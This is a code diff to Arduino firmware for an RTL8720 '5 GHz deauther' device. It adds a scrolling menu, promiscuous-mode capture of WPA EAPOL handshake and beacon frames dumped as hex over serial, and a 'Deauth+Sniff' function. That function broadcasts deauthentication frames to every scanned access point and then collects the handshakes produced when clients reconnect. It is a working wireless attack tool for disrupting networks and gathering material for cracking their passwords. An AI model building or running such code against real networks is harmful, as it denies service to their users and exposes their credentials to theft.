@@ -1,4 +1,8 @@
 // Oled code made by warwick320 // updated by Cypher --> github.com/dkyazzentwatwa/cypher-5G-deauther
+// Updated again by Nickguitar --> github.com/Nickguitar/cypher-5G-deauther
+
+// Global flag to indicate that the sniff callback has been triggered.
+volatile bool sniffCallbackTriggered = false;
 
 // Wifi
 #include "wifi_conf.h"
@@ -8,6 +12,7 @@
 #include "WiFi.h"
 #include "WiFiServer.h"
 #include "WiFiClient.h"
+#include "wifi_constants.h"
 
 // Misc
 #undef max
@@ -32,6 +37,14 @@ Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 #define BTN_UP PA12
 #define BTN_OK PA13
 
+
+#define TOTAL_MENU_ITEMS 5
+const char* mainMenuItems[TOTAL_MENU_ITEMS] = { "Attack", "Scan", "Select", "Sniff", "Deauth+Sniff" };
+
+// These globals control which items are visible.
+int menuOffset = 0;     // Either 0 or 1 in our case.
+int selectedIndex = 0;  // 0 to 2 (the visible slot index)
+
 // VARIABLES
 typedef struct {
   String ssid;
@@ -42,8 +55,47 @@ typedef struct {
   uint channel;
 } WiFiScanResult;
 
+
+// Define a structure for storing handshake data.
+#define MAX_FRAME_SIZE 512
+#define MAX_HANDSHAKE_FRAMES 4
+#define MAX_MANAGEMENT_FRAMES 10
+
+struct HandshakeFrame {
+  unsigned int length;
+  unsigned char data[MAX_FRAME_SIZE];
+};
+
+struct HandshakeData {
+  HandshakeFrame frames[MAX_HANDSHAKE_FRAMES];
+  unsigned int frameCount;
+};
+
+HandshakeData capturedHandshake;
+
+struct ManagementFrame {
+  unsigned int length;
+  unsigned char data[MAX_FRAME_SIZE];
+};
+
+struct ManagementData {
+  ManagementFrame frames[MAX_MANAGEMENT_FRAMES];
+  unsigned int frameCount;
+};
+
+ManagementData capturedManagement;
+
+// Function to reset both handshake and management frame data.
+void resetCaptureData() {
+  capturedHandshake.frameCount = 0;
+  memset(capturedHandshake.frames, 0, sizeof(capturedHandshake.frames));
+  capturedManagement.frameCount = 0;
+  memset(capturedManagement.frames, 0, sizeof(capturedManagement.frames));
+}
+
+
 // Credentials for you Wifi network
-char *ssid = "littlehakr";
+char *ssid = "0x7359";
 char *pass = "0123456789";
 
 int current_channel = 1;
@@ -71,9 +123,6 @@ const unsigned long DEBOUNCE_DELAY = 150;
 
 // IMAGES
 static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };
-static const unsigned char PROGMEM image_off_text_bits[] = { 0x67, 0x70, 0x94, 0x40, 0x96, 0x60, 0x94, 0x40, 0x64, 0x40 };
-static const unsigned char PROGMEM image_network_not_connected_bits[] = { 0x82, 0x0e, 0x44, 0x0a, 0x28, 0x0a, 0x10, 0x0a, 0x28, 0xea, 0x44, 0xaa, 0x82, 0xaa, 0x00, 0xaa, 0x0e, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0xea, 0xaa, 0xaa, 0xaa, 0xee, 0xee, 0x00, 0x00 };
-static const unsigned char PROGMEM image_cross_contour_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x51, 0x40, 0x8a, 0x20, 0x44, 0x40, 0x20, 0x80, 0x11, 0x00, 0x20, 0x80, 0x44, 0x40, 0x8a, 0x20, 0x51, 0x40, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00 };
 
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
@@ -99,6 +148,7 @@ void selectedmenu(String text) {
 }
 
 int scanNetworks() {
+  Serial.println(F("Scanning WiFi Network"));
   DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
   scan_results.clear();
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
@@ -165,7 +215,7 @@ void BecaonDeauth() {
   display.setTextColor(SSD1306_WHITE);
   display.setTextSize(1);
   display.setCursor(5, 25);
-  display.println("Becaon+Deauth Attack...");
+  display.println("Beacon+Deauth Attack...");
   display.display();
   while (true) {
     if (digitalRead(BTN_OK) == LOW) {
@@ -190,7 +240,7 @@ void Becaon() {
   display.setTextColor(SSD1306_WHITE);
   display.setTextSize(1);
   display.setCursor(5, 25);
-  display.println("Becaon Attack...");
+  display.println("Beacon Attack...");
   display.display();
   while (true) {
     if (digitalRead(BTN_OK) == LOW) {
@@ -238,24 +288,38 @@ void drawStatusBar(const char *status) {
   display.setTextColor(WHITE);
 }
 
-
-
-void drawMainMenu(int selectedIndex) {
+void drawMainMenu() {
   display.clearDisplay();
-
-  // Status bar
   drawStatusBar("MAIN MENU");
-
-  // Frame
   drawFrame();
 
-  // Menu items with enhanced visual style
-  const char *menuItems[] = { "Attack", "Scan", "Select" };
-  for (int i = 0; i < 3; i++) {
-    drawMenuItem(20 + (i * 15), menuItems[i], i == selectedIndex);
+  // Display three items starting at menuOffset.
+  for (int i = 0; i < 4; i++) {
+    int itemIndex = i + menuOffset;
+    drawMenuItem(20 + (i * 15), mainMenuItems[itemIndex], (i == selectedIndex));
   }
+
+  // Draw scroll arrows on the right side.
+  int arrowX = SCREEN_WIDTH - 12;
+
+  // For the up arrow: if menuOffset > 0, there are items above.
+  if (menuOffset > 0) {
+    // If the first row (i.e. visible row index 0) is selected, draw arrow in BLACK.
+    uint16_t upArrowColor = (selectedIndex == 0) ? BLACK : WHITE;
+    display.fillTriangle(arrowX, 25, arrowX + 4, 20, arrowX + 8, 25, upArrowColor);
+  }
+
+  // For the down arrow: if there are items below.
+  if (menuOffset < TOTAL_MENU_ITEMS - 3) {
+    // If the bottom row (i.e. visible row index 2) is selected, use BLACK.
+    uint16_t downArrowColor = (selectedIndex == 2) ? BLACK : WHITE;
+    display.fillTriangle(arrowX, 55, arrowX + 4, 60, arrowX + 8, 55, downArrowColor);
+  }
+
   display.display();
 }
+
+
 
 void drawScanScreen() {
   display.clearDisplay();
@@ -346,29 +410,19 @@ void drawAttackScreen(int attackType) {
 void titleScreen(void) {
   display.clearDisplay();
   display.setTextWrap(false);
-  display.setTextSize(1);       // Set text size to normal
-  display.setTextColor(WHITE);  // Set text color to white
-  display.setCursor(6, 7);
-  display.print("little hakr presents");
-  display.setCursor(24, 48);
+  display.setTextSize(2);    
+  display.setTextColor(WHITE);
+  display.setCursor(7, 7);
+  display.print("0x7359");
+  display.setCursor(94, 48);
   //display.setFont(&Org_01);
-  display.print("5 G H Z");
-  //display.setFont(&Org_01);
-  display.setCursor(4, 55);
-  display.print("d e a u t h e r");
-  display.drawBitmap(1, 20, image_wifi_not_connected__copy__bits, 19, 16, 1);
-  display.drawBitmap(112, 35, image_off_text_bits, 12, 5, 1);
-  display.drawBitmap(45, 19, image_wifi_not_connected__copy__bits, 19, 16, 1);
-  display.drawBitmap(68, 13, image_wifi_not_connected__copy__bits, 19, 16, 1);
-  display.drawBitmap(24, 34, image_off_text_bits, 12, 5, 1);
-  display.drawBitmap(106, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
-  display.drawBitmap(109, 48, image_network_not_connected_bits, 15, 16, 1);
-  //display.setFont(&Org_01);
-  display.drawBitmap(88, 25, image_wifi_not_connected__copy__bits, 19, 16, 1);
-  display.drawBitmap(24, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
-  display.drawBitmap(9, 35, image_cross_contour_bits, 11, 16, 1);
+  display.setTextSize(1);
+  display.print("5 GHz");
+  display.setCursor(82, 55);
+  display.print("deauther");
+  display.drawBitmap(52, 31, image_wifi_not_connected__copy__bits, 19, 16, 1);
   display.display();
-  delay(2000);
+  delay(400);
 }
 
 // New function to handle attack menu and execution
@@ -478,6 +532,7 @@ void setup() {
   pinMode(BTN_DOWN, INPUT_PULLUP);
   pinMode(BTN_UP, INPUT_PULLUP);
   pinMode(BTN_OK, INPUT_PULLUP);
+
   Serial.begin(115200);
   if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
     Serial.println(F("SSD1306 init failed"));
@@ -506,69 +561,487 @@ void setup() {
   SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
 }
 
+
+void printHandshakeData() {
+  Serial.println("---- Captured Handshake Data ----");
+  Serial.print("Total handshake frames captured: ");
+  Serial.println(capturedHandshake.frameCount);
+  
+  // Iterate through each stored handshake frame.
+  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
+    HandshakeFrame &hf = capturedHandshake.frames[i];
+    Serial.print("Frame ");
+    Serial.print(i + 1);
+    Serial.print(" (");
+    Serial.print(hf.length);
+    Serial.println(" bytes):");
+    
+    // Print hex data in a formatted manner.
+    for (unsigned int j = 0; j < hf.length; j++) {
+      // Print a newline every 16 bytes with offset
+      if (j % 16 == 0) {
+        Serial.println();
+        Serial.print("0x");
+        Serial.print(j, HEX);
+        Serial.print(": ");
+      }
+      // Print leading zero if needed.
+      if (hf.data[j] < 16) {
+        Serial.print("0");
+      }
+      Serial.print(hf.data[j], HEX);
+      Serial.print(" ");
+    }
+    Serial.println();
+    Serial.println("--------------------------------");
+  }
+  Serial.println("---- End of Handshake Data ----");
+}
+
+void printManagementData() {
+  Serial.println("---- Captured Management Data ----");
+  Serial.print("Total management frames captured: ");
+  Serial.println(capturedManagement.frameCount);
+  
+  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
+    ManagementFrame &mf = capturedManagement.frames[i];
+    Serial.print("Management Frame ");
+    Serial.print(i + 1);
+    Serial.print(" (");
+    Serial.print(mf.length);
+    Serial.println(" bytes):");
+    
+    for (unsigned int j = 0; j < mf.length; j++) {
+      if (j % 16 == 0) {
+        Serial.println();
+        Serial.print("0x");
+        Serial.print(j, HEX);
+        Serial.print(": ");
+      }
+      if (mf.data[j] < 16) {
+        Serial.print("0");
+      }
+      Serial.print(mf.data[j], HEX);
+      Serial.print(" ");
+    }
+    Serial.println();
+    Serial.println("--------------------------------");
+  }
+  Serial.println("---- End of Management Data ----");
+}
+
+
+
+
+
+// Updated function to scan the entire packet for EAPOL EtherType (0x88 0x8E)
+// and print every instance it finds.
+bool isEAPOLFrame(const unsigned char *packet, unsigned int length) {
+  // Define the expected LLC+EAPOL sequence.
+  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
+  const unsigned int seq_len = sizeof(eapol_sequence);
+  
+  // Iterate through the packet and look for the sequence.
+  for (unsigned int i = 0; i <= length - seq_len; i++) {
+    bool match = true;
+    for (unsigned int j = 0; j < seq_len; j++) {
+      if (packet[i + j] != eapol_sequence[j]) {
+        match = false;
+        break;
+      }
+    }
+    if (match) {
+      Serial.print("EAPOL sequence found at offset: ");
+      Serial.println(i);
+      return true;
+    }
+  }
+  return false;
+}
+
+
+// Helper function: extract frame type and subtype from the first two bytes.
+void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype) {
+  // Frame Control field is in the first two bytes (little endian)
+  unsigned short fc = packet[0] | (packet[1] << 8);
+  type = (fc >> 2) & 0x03;      // bits 2-3
+  subtype = (fc >> 4) & 0x0F;   // bits 4-7
+}
+
+// Helper function: returns the offset at which the EAPOL payload starts
+// Find the offset where the LLC+EAPOL signature starts.
+unsigned int findEAPOLPayloadOffset(const unsigned char *packet, unsigned int length) {
+  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
+  const unsigned int sig_len = sizeof(eapol_signature);
+  for (unsigned int i = 0; i <= length - sig_len; i++) {
+    bool match = true;
+    for (unsigned int j = 0; j < sig_len; j++) {
+      if (packet[i + j] != eapol_signature[j]) {
+        match = false;
+        break;
+      }
+    }
+    if (match) return i;
+  }
+  return 0; // if not found, return 0 (compare full frame)
+}
+
+// Extract the Sequence Control field (assumes 24-byte header; bytes 22-23).
+unsigned short getSequenceControl(const unsigned char *packet, unsigned int length) {
+  if (length < 24) return 0;
+  return packet[22] | (packet[23] << 8);
+}
+
+void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param) {
+  sniffCallbackTriggered = true;
+  
+  unsigned int type, subtype;
+  get_frame_type_subtype(packet, type, subtype);
+  
+  // --- Capture Management Frames (Beacons/Probe Responses) ---
+  if (type == 0) {  // Management
+    if (subtype == 8 || subtype == 5) { // Beacon or Probe Response
+      if (capturedManagement.frameCount < MAX_MANAGEMENT_FRAMES) {
+        ManagementFrame *mf = &capturedManagement.frames[capturedManagement.frameCount];
+        mf->length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
+        memcpy(mf->data, packet, mf->length);
+        capturedManagement.frameCount++;
+        Serial.print("Stored management frame count: ");
+        Serial.println(capturedManagement.frameCount);
+      }
+    }
+  }
+  
+  // --- Capture EAPOL (Handshake) Frames ---
+  // Check for LLC+EAPOL signature: AA AA 03 00 00 00 88 8E
+  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
+  const unsigned int seq_len = sizeof(eapol_sequence);
+  bool isEAPOL = false;
+  for (unsigned int i = 0; i <= length - seq_len; i++) {
+    bool match = true;
+    for (unsigned int j = 0; j < seq_len; j++) {
+      if (packet[i + j] != eapol_sequence[j]) {
+        match = false;
+        break;
+      }
+    }
+    if (match) { isEAPOL = true; break; }
+  }
+  
+  if (isEAPOL) {
+    Serial.println("EAPOL frame detected!");
+    
+    // Create a temporary handshake frame
+    HandshakeFrame newFrame;
+    newFrame.length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
+    memcpy(newFrame.data, packet, newFrame.length);
+    
+    // Extract the sequence control from the MAC header.
+    unsigned short seqControl = getSequenceControl(newFrame.data, newFrame.length);
+    // And find the EAPOL payload offset.
+    unsigned int payloadOffset = findEAPOLPayloadOffset(newFrame.data, newFrame.length);
+    unsigned int newPayloadLength = (payloadOffset < newFrame.length) ? (newFrame.length - payloadOffset) : newFrame.length;
+    
+    bool duplicate = false;
+    for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
+      HandshakeFrame *stored = &capturedHandshake.frames[i];
+      unsigned short storedSeq = getSequenceControl(stored->data, stored->length);
+      unsigned int storedPayloadOffset = findEAPOLPayloadOffset(stored->data, stored->length);
+      unsigned int storedPayloadLength = (storedPayloadOffset < stored->length) ? (stored->length - storedPayloadOffset) : stored->length;
+      
+      // First check: if sequence numbers differ, they are different frames.
+      if (storedSeq == seqControl) {
+        // Now compare the payload portion.
+        if (storedPayloadLength == newPayloadLength &&
+            memcmp(stored->data + storedPayloadOffset, newFrame.data + payloadOffset, newPayloadLength) == 0) {
+          duplicate = true;
+          Serial.print("Duplicate handshake frame (seq 0x");
+          Serial.print(seqControl, HEX);
+          Serial.println(") detected, ignoring.");
+          break;
+        }
+      }
+    }
+    
+    if (!duplicate && capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES) {
+      memcpy(capturedHandshake.frames[capturedHandshake.frameCount].data, newFrame.data, newFrame.length);
+      capturedHandshake.frames[capturedHandshake.frameCount].length = newFrame.length;
+      capturedHandshake.frameCount++;
+      Serial.print("Stored handshake frame count: ");
+      Serial.println(capturedHandshake.frameCount);
+      if (capturedHandshake.frameCount == MAX_HANDSHAKE_FRAMES) {
+        Serial.println("Complete handshake captured!");
+      }
+    }
+  }
+}
+
+
+
+
+
+
+
+
+// Function to enable promiscuous (sniffing) mode using RTL8720DN's API.
+void enableSniffing() {
+  Serial.println("Enabling sniffing mode...");
+  
+  // RTW_PROMISC_ENABLE_2 is used to enable promiscuous mode,
+  // rtl8720_sniff_callback is our callback function,
+  // and the third parameter (1) might specify additional options (e.g., channel filtering).
+  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
+  
+  Serial.println("Sniffing mode enabled. Waiting for packets...");
+}
+
+// Function to disable promiscuous mode.
+void disableSniffing() {
+  Serial.println("Disabling sniffing mode...");
+  // Passing NULL as callback and RTW_PROMISC_DISABLE constant (if defined)
+  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
+  Serial.println("Sniffing mode disabled.");
+}
+
+// Updated startSniffing function that uses enableSniffing() and disableSniffing()
+void startSniffing() {
+  // Clear display and show initial message.
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
+  display.setCursor(5, 25);
+  display.println("Sniffing...");
+  display.display();
+
+  // Reset capture buffers.
+  resetCaptureData();
+
+  // Set the channel to that of the target AP.
+  wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
+  Serial.print("Switched to channel: ");
+  Serial.println(scan_results[scrollindex].channel);
+
+  // Enable promiscuous mode.
+  enableSniffing();
+  
+  // Animation frames for spinner.
+  const char spinnerChars[] = { '/', '-', '\\', '|' };
+  unsigned int spinnerIndex = 0;
+  
+  // Continue sniffing until we have 4 handshake frames and at least one management frame, or until timeout.
+  unsigned long sniffStart = millis();
+  const unsigned long timeout = 60000; // 60 seconds timeout
+  bool cancelled = false;
+  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
+          capturedManagement.frameCount == 0) &&
+         (millis() - sniffStart) < timeout) {
+      
+      // Update the OLED display with the current handshake count and spinner animation.
+      display.clearDisplay();
+      display.setTextSize(1);
+      display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
+      display.setCursor(5, 10);
+      display.print(spinnerChars[spinnerIndex % 4]);
+      SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
+      display.print(" Sniffing (");
+      display.print(SSIDCh);
+      display.print(")");
+      display.setCursor(5, 25);
+      display.print(SelectedSSID);
+      
+      
+      // Draw the spinner animation on the next line.
+      display.setCursor(5, 45);
+      display.print("Captured EAPOL: ");
+      display.print(capturedHandshake.frameCount);
+      display.print("/4");
+      
+      display.display();
+      
+      spinnerIndex++; // Update spinner for next iteration.
+      delay(100);
+
+      // Allow user to cancel sniffing by pressing OK.
+      if (digitalRead(BTN_OK) == LOW) {
+          Serial.println("User canceled sniffing.");
+          cancelled = true;
+          break;
+      }
+  }
+  
+  // Disable promiscuous mode.
+  disableSniffing();
+  
+  // Final update: show final count and a prompt to go back.
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
+  display.setCursor(5, 20);
+  if (cancelled) {
+      display.println("Sniffing canceled!");
+  } else if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES && capturedManagement.frameCount > 0) {
+      display.println("Sniffing complete!");
+      digitalWrite(LED_R, LOW);
+      digitalWrite(LED_G, HIGH);
+      digitalWrite(LED_B, LOW);
+  } else {
+      display.println("Sniff timeout!");
+      digitalWrite(LED_R, HIGH);
+      digitalWrite(LED_G, LOW);
+      digitalWrite(LED_B, LOW);
+  }
+  display.setCursor(5, 40);
+  display.println("Press OK to return");
+  display.display();
+  
+  // Wait for the user to press the OK button (active low)
+  while (digitalRead(BTN_OK) != LOW) {
+    delay(10);
+  }
+  delay(150);  // Debounce delay
+
+  Serial.println("Finished sniffing.");
+}
+
+
+void deauthAndSniff() {
+  // Display combined attack mode message.
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
+  display.setCursor(5, 15);
+  display.println("Deauth + Sniff");
+  display.setCursor(5, 30);
+  display.println("Starting deauth...");
+  display.display();
+  
+  // Duration (in milliseconds) for deauth attack.
+  const unsigned long deauthDuration = 3000; // 3 seconds deauth attack.
+  unsigned long deauthStart = millis();
+  
+  // Deauth attack: force clients to disconnect.
+  // For example, iterate through the list of scanned APs (or a specific target).
+  while (millis() - deauthStart < deauthDuration) {
+    for (size_t i = 0; i < scan_results.size(); i++) {
+      memcpy(deauth_bssid, scan_results[i].bssid, 6);
+      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
+      // Send deauth frames with a few different reason codes.
+      deauth_reason = 1;
+      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+      deauth_reason = 4;
+      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+      deauth_reason = 16;
+      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+    }
+    delay(100);
+  }
+  
+  // Inform the user that deauthing is done and that we are now sniffing.
+  display.clearDisplay();
+  display.setCursor(5, 15);
+  display.println("Deauth done!");
+  display.setCursor(5, 30);
+  display.println("Starting sniff...");
+  display.display();
+  delay(500);
+  
+  // Start sniffing for the handshake.
+  startSniffing();
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 void loop() {
   unsigned long currentTime = millis();
 
-  // Draw the enhanced main menu interface
-  drawMainMenu(menustate);
+  // Always draw the main menu.
+  drawMainMenu();
 
-  // Handle OK button press
+  // Check if the OK (select) button was pressed.
   if (digitalRead(BTN_OK) == LOW) {
     if (currentTime - lastOkTime > DEBOUNCE_DELAY) {
-      if (okstate) {
-        switch (menustate) {
-          case 0:  // Attack
-            // Show attack options and handle attack execution
-            display.clearDisplay();
-            attackLoop();
-            break;
-
-          case 1:  // Scan
-            // Execute scan with animation
-            display.clearDisplay();
-            drawScanScreen();
-            if (scanNetworks() == 0) {
-              drawStatusBar("SCAN COMPLETE");
-              display.display();
-              delay(1000);
-            }
-            break;
-
-          case 2:  // Select Network
-            // Show network selection interface
-            networkSelectionLoop();
-            break;
+      // Decide what to do based on the currently visible item.
+      int actualIndex = selectedIndex + menuOffset;  // Map visible index to full array index.
+      if (actualIndex == 0) {
+        // "Attack" option
+        attackLoop();
+      } else if (actualIndex == 1) {
+        // "Scan" option
+        display.clearDisplay();
+        drawScanScreen();
+        if (scanNetworks() == 0) {
+          drawStatusBar("SCAN COMPLETE");
+          display.display();
+          delay(1000);
         }
+      } else if (actualIndex == 2) {
+        // "Select" option
+        networkSelectionLoop();
+      } else if (actualIndex == 3) {
+        // "Sniff" option
+        startSniffing();
+      } else if (actualIndex == 4) { 
+          deauthAndSniff();
       }
       lastOkTime = currentTime;
     }
   }
 
-  // Handle Down button
-  if (digitalRead(BTN_DOWN) == LOW) {
+  // Handle BTN_DOWN
+  if (digitalRead(BTN_UP) == LOW) {
     if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
-      if (menustate > 0) {
-        menustate--;
-        // Visual feedback
-        display.invertDisplay(true);
-        delay(50);
-        display.invertDisplay(false);
+      // If the select button is held, we adjust the menu offset.
+      if (digitalRead(BTN_OK) == LOW) {
+        // If not at the bottom page yet, scroll down.
+        if (menuOffset < TOTAL_MENU_ITEMS - 3) {
+          menuOffset++;
+          // Optionally, set selectedIndex to the middle (or leave as is)
+          selectedIndex = 0;  // Reset visible selection
+        }
+      } else {
+        // Normal navigation: move the selection down.
+        if (selectedIndex < 2) {
+          selectedIndex++;
+        } else if (menuOffset < TOTAL_MENU_ITEMS - 3) {
+          // If at the bottom of the visible list, scroll down.
+          menuOffset++;
+        }
       }
       lastDownTime = currentTime;
     }
   }
 
-  // Handle Up button
-  if (digitalRead(BTN_UP) == LOW) {
+  // Handle BTN_UP
+  if (digitalRead(BTN_DOWN) == LOW) {
     if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
-      if (menustate < 2) {
-        menustate++;
-        // Visual feedback
-        display.invertDisplay(true);
-        delay(50);
-        display.invertDisplay(false);
+      if (digitalRead(BTN_OK) == LOW) {
+        // With select pressed, scroll upward if possible.
+        if (menuOffset > 0) {
+          menuOffset--;
+          selectedIndex = 0;  // or keep the same relative index
+        }
+      } else {
+        // Normal navigation: move selection up.
+        if (selectedIndex > 0) {
+          selectedIndex--;
+        } else if (menuOffset > 0) {
+          menuOffset--;
+        }
       }
       lastUpTime = currentTime;
     }
   }
 }
+
